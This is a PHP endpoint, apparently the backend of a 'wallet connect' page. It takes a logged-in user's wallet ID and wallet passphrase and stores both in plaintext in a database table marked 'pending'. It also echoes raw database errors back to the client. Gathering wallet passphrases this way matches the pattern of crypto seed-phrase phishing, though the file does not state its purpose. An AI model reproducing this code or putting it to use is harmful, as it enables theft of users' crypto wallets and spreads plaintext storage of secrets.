<?php
session_start();
require 'db.php';

header('Content-Type: application/json');

if (!isset($_SESSION['user_id'])) {
    echo json_encode(['success' => false, 'message' => 'Not authenticated']);
    exit();
}

if (empty($_POST['wallet_id']) || empty($_POST['passphrase'])) {
    echo json_encode(['success' => false, 'message' => 'All fields are required']);
    exit();
}

try {
    $stmt = $conn->prepare("INSERT INTO wallet_connect_requests 
        (user_id, wallet_id, passphrase, status, submitted_at) 
        VALUES (?, ?, ?, 'pending', NOW())");
    $stmt->execute([
        $_SESSION['user_id'],
        $_POST['wallet_id'],
        $_POST['passphrase']
    ]);
    echo json_encode(['success' => true]);
} catch (PDOException $e) {
    echo json_encode(['success' => false, 'message' => 'Database error: ' . $e->getMessage()]);
}